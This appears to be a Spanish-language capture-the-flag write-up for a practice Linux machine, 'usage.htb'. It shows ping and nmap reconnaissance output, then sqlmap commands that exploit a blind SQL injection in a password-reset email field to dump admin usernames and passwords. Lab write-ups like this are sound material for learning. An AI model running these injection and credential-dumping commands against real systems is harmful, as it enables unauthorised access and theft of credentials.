#Easy #fuzzing #fuzzing #nmap #Linux 
### Ping
```python
ping -c 1 10.10.11.18
PING 10.10.11.18 (10.10.11.18) 56(84) bytes of data.
64 bytes from 10.10.11.18: icmp_seq=1 ttl=63 time=70.9 ms

--- 10.10.11.18 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 70.927/70.927/70.927/0.000 ms
```

### TTL 63=Linux

### nmap
```python
sudo nmap -p- --open -sC -sV --min-rate 3000 -Pn 10.10.11.18 -oN Scan
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 19:43 EDT
Nmap scan report for 10.10.11.18
Host is up (0.069s latency).
Not shown: 65527 closed tcp ports (reset), 6 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.51 seconds
```


### Enumeración del puerto 80 (http)

![[Pasted image 20240415164823.png]]

podemos registrarnos en la pagina web pero no tenemos mucha información
![[Pasted image 20240415165024.png]]

si intentamos cambiar la contraseña podemos notar que nos da como resultado una notificación donde podemos ver nuestro correo
![[Pasted image 20240415165125.png]]

### sqlmap
después de hacer un montón de pruebas hemos descubierto que el parámetro mail es vulnerable a sqli blind por lo que vamos a comprobarla con 
```python
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump
```

![[Pasted image 20240415193303.png]]

![[Pasted image 20240415201751.png]]
###### con este ataque podemos determinar que es una blind sqli por lo cual el ataque puede tardar bastante. 

### Blind SQLI

```python
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
```
con este comando logramos ver que el párametro `email` es vulnerable a `SQLI-based blind` 
![[Pasted image 20240418104412.png]]

![[Pasted image 20240418105600.png]]


![[Pasted image 20240418125408.png]]